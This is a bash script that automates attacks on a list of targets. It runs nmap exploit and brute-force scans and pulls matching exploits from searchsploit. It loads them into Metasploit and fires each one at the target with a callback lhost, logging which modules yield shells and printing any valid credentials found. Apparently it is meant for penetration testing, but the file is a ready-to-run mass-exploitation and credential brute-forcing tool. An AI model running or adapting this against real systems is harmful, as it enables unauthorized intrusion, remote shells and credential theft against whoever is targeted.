#!/bin/bash
###------------------------------DEFINE FUNCTIONS------------------------------###
function load(){
	for i in range {1..5}
	do
		echo "."
		echo
		sleep .02
	done
}
function clean_check(){
	if [[ ! -f $1 ]]
	then
		echo "Cleaning up from previous sessions..."
	else
		rm $1
	fi
}
function main(){
#Housekeeping
clean_check exploits.txt
clean_check exp.txt
clean_check runlist.txt
clean_check cve.txt
clean_check shells.txt
clean_check raw_service_output.txt
clean_check services.txt
clean_check success-test.txt
clear

###------------------------------READ // COLLECT TARGET IP ADDRESS------------------------------###
target=$(cat target.txt)
if [[ $target == "" ]]
then
        echo -n "Enter a target: "
        read -n target
	echo $target > target.txt
else
        :
fi

if [[ $lhost == "" ]]
then
        lhost=$(ifconfig eth0 | grep "inet " | awk ' { print $2 } ')
else
        :
fi

###------------------------------CHECK FOR // CREATE TARGET INTEL FILES------------------------------###
#Run nmap exploit scan if no file exists/user chooses to
clear
if [[ ! -f nmap-exploit-$target.xml ]]
then
echo "No existing nmap exploit scan file present"
echo "Initiating scan..."
load
nmap $target -T5 -Pn -A -sV -oX nmap-exploit-$target.xml --script=exploit
load
echo "Allowing target to rest..." && sleep 30
load
else
        echo "Existing nmap exploit xml scan report found, would you like to continue or rescan?"
        echo -n "[C]ontinue or [R]escan: "
        read choice </dev/tty
        case $choice in
                [Cc] )
                        echo
                        echo "Continuing with existing scan file"
                        load
                        ;;
                [Rr] )
                        rm nmap-exploit-$target.xml
                        nmap $target -T5 -Pn -A -sV -oX nmap-exploit-$target.xml --script=exploit
                        load
			echo "Allowing target to rest..." && sleep 30
			load
			;;
esac
fi

#Convert XML report into human-readable HTML for final report
xsltproc nmap-exploit-$target.xml -o nmap-exploit-$target.html

###------------------------------GATHER EXPLOITS------------------------------###
#Check for exploits using the nmap vulnerability xml report, output paths to exploits.txt
echo "Searching for known exploits via searchsploit..."
load
searchsploit -j --nmap nmap-vuln-$target.xml > exp.txt
cat exp.txt | grep -o  "/usr/share/exploitdb/exploits/.*" | sed -e "s/"}"//g" -e "s/","//g" -e "s/\"//g" > exploits.txt

#Check for exploits using the nmap malware xml report, output paths to exploits.txt
searchsploit -j --nmap nmap-mal-$target.xml > exp.txt
cat exp.txt | grep -o  "/usr/share/exploitdb/exploits/.*" | sed -e "s/"}"//g" -e "s/","//g" -e "s/\"//g" >> exploits.txt

#Check for exploits using the nmap exploit xml report, output paths to exploits.txt
searchsploit -j --nmap nmap-exploit-$target.xml > exp.txt
cat exp.txt | grep -o  "/usr/share/exploitdb/exploits/.*" | sed -e "s/"}"//g" -e "s/","//g" -e "s/\"//g" >> exploits.txt

###------------------------------FIND EXPLOITS BY USING PROTOCOLS AND SERVICE INFORMATION AS QUERIES------------------------------###
load
echo "Searching for known exploits via service names..."
load

#Create services.txt
msfdb init
msfconsole -x "db_import nmap-vuln-$target.xml ; services ; exit" > raw-service-output.txt
cat raw-service-output.txt | grep "$target" > services.txt
load
echo "One moment while I gather the exploits..."
load

#Clean up the services file
cat services.txt | while read line;
do
        grep "open" > services-cleaned.txt
done
rm services.txt
mv services-cleaned.txt services.txt

#Seach by protocol and then service name
cat services.txt | awk ' { print $4 } ' | while read line;
do
	#echo "Searching exploits with query: "$line >> dbnmap-searchlog.txt
	searchsploit -j $line > exp.txt
	cat exp.txt | grep *".rb" | grep -o "/usr/share/exploitdb/.*" | sed -e "s/","//g" -e "s/\"//g" -e "s/\}//g" >> exploits.txt
done

cat services.txt | awk ' { print $6 } ' | while read line;
do
	#echo "Searching exploits with query: "$line >> dbnmap-searchlog.txt
	searchsploit -j $line > exp.txt
        cat exp.txt | grep *".rb" | grep -o "/usr/share/exploitdb/.*" | sed -e "s/","//g" -e "s/\"//g" -e "s/\}//g" >> exploits.txt
done

###------------------------------CLEAN UP EXPLOITS------------------------------###
load
echo "Cleaning up non-compatible and duplicate exploits..."
load

#Remove non-ruby exploits for MSF4 compatibility
cat exploits.txt | while read line;
do
	if [[ $line == *".rb"* ]]
	then
		:
	else
		cat exploits.txt | grep ".rb" >> exploits-rb.txt
	fi
done
rm exploits.txt
mv exploits-rb.txt exploits.txt

#Remove Duplicates
touch exploits-no-dups.txt
cat exploits.txt | while read line;
do
        checklist=$(cat exploits-no-dups.txt)
        if [[ "$checklist" == *"$line"* ]]
        then
                echo
        else
                echo "$line" >> exploits-no-dups.txt
        fi
done
rm exploits.txt
mv exploits-no-dups.txt exploits.txt

###------------------------------MIGRATE EXPLOITS TO MSF------------------------------###
#Create identical subfolder structure in ~/.msf4/modules/
echo "Prepping MSF directory for exploit migration, this may take some time depending on the number of exploits found..."
load
cat exploits.txt | while read line;
do
	path=$(echo $line | awk -F "/" ' { print $6"/",$7"/" } ' | sed "s/ //g");
	#echo "Making path /usr/share/metasploit-framework/modules/exploits/"$path
	sudo mkdir -p /usr/share/metasploit-framework/modules/exploits/$path

#Read through exploits and copy to MSF folder
	file=$(echo "$line")
	#echo "The copy location is /usr/share/metasploit-framework/modules/exploits/"$path
	cp "$file" /usr/share/metasploit-framework/modules/exploits/$path
	echo $file | awk -F "/" ' { print $5,$6,$7,$8 } ' | sed "s/ /\//g" >> runlist.txt
done

###------------------------------RUN EXPLOITS------------------------------###
#Add non-ruby exploits from MSF
msfconsole -x "db_import $target nmap-vuln-$target ; vulns ; exit" > msf-vulns.txt
cat msf-vulns.txt | grep -o "CVE".* | awk -F , ' { print $1 } ' | while read line
do
        echo "MSF Vuln is $line"
        msfconsole -x "search $line -o msf-vuln.csv ; exit"
        cat msf-vuln.csv | awk -F , ' { print $1 } ' | sed 's/Name//g' | while read line
        do
                #echo "Exploit is $line"
                echo $line >> runlist.txt
        done
done

#Clean up the runlist file
cat runlist.txt | sed 's/\"//g' > runlist-cleaned.txt
rm runlist.txt
mv runlist-cleaned.txt runlist.txt
sed -i '/^$/d' runlist.txt
load

#Run exploits
echo "Running exploits against target..."
load
msfdb init
load
num_done=0
total=$(wc -l runlist.txt | awk ' { print $1 } ')
cat runlist.txt | while read line;
do
	((num_done+=1))
	echo "Attacking with $line ($num_done/$total)"
	msfconsole -x "db_import nmap-vuln-$target.xml ; set rhosts $target ; set lhost $lhost ; use $line ; run -z ; exit -y" -o success-test.txt
	echo $line >> log-exploits.txt
	if [[ $(cat success-test.txt | egrep "Found shell|Command shell session") != "" ]]
	then
		echo -e "\e[32;5m<------Found Shell with $line------>\e[m"
		echo $line >> shells.txt
		echo
	fi
done

#List exploits that yielded shells
if [[ -f "shells.txt" ]]
then
	load
	echo -e "\e[32mValid Shells on "$target"\e[m"
	echo
	cat shells.txt
fi

###------------------------------PULL CVE'S FOR REPORT------------------------------###
#Pull CVE's from scan results
echo $(cat nmap-vuln-$target.xml | grep -o "CVE-"....-....) | tr " " "\n" > cve.txt
touch cve-no-dups.txt

#Remove duplicates
cat cve.txt | while read line;
do
        checklist=$(cat cve-no-dups.txt)
        if [[ "$checklist" == *"$line"* ]]
        then
                echo
        else
                echo "$line" >> cve-no-dups.txt
        fi
done
rm cve.txt
mv cve-no-dups.txt cve.txt
echo "Here's a list of CVE's the target may be vulnerable to..."
load
cat cve.txt
load

###------------------------------BRUTE SCAN------------------------------###
echo "Starting brute scripts..."
load
if [[ ! -f nmap-brute-$target.txt ]]
then
echo "No existing nmap brute scan file present"
echo "Initiating scan..."
load
nmap $target -T5 -A -Pn -sV --script=brute > nmap-brute-$target.txt
else
        echo "Existing nmap brute xml scan report found, would you like to continue or rescan?"
        echo -n "[C]ontinue or [R]escan: "
        read choice </dev/tty
        case $choice in
                [Cc] )
                        echo
                        ;;
                [Rr] )
                        rm nmap-brute-$target.xml
			nmap $target -T5 -A -Pn -sV --script=brute > nmap-brute-$target.txt
                        load
			;;
esac
fi

#Grep for success in output file, export results to file
brute_results=$(cat nmap-brute-$target.txt | egrep -B 3 "Valid credentials|does not require authentication" | sed -e "/ERROR/d" -e "/FAILED/d")
if [[ $brute_results != "" ]]
then
	echo "$brute_results" | tr "\--" "\n" > brute-scan-results-$target.txt
fi

#Show valid creds, if any
brute_creds=$(cat nmap-brute-$target.txt | egrep -B 3 "Valid credentials" | sed -e "/ERROR/d" -e "/FAILED/d")
if [[ $brute_creds != "" ]]
then
	load
	echo -e "\e[32;5m<------FOUND VALID CREDS------>\e[m"
	echo
	echo -e "\e[32m$brute_creds\e[m"
fi

#Move report files to Final_Report folder
./report.bash
load
echo "EXPLOITATION PHASE COMPLETE, SEE REPORTS IN "Final_Report""
}

cat target-list.txt | sed '/^$/d' | while read line;
do
	echo "Running exploit module for: $line"
	echo $line > target.txt
	main
done
